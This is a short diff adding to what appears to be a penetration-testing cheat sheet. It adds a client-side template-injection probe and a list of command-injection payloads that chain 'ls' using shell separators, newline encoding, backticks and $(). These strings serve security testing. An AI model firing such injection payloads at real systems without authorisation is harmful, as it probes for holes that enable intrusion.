@@ -51,6 +51,19 @@ python3 -m http.server
 ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
 php -S $ip:80
 
+# Client side template injection test
+{{7*7}}
+
+# Command injection on client side template injection test
+;ls
+||ls;
+|ls;
+&&ls;
+&ls;
+%0Als
+`ls`
+$(ls)
+
 #---------------------------------------------------------------------------------------#
 
 
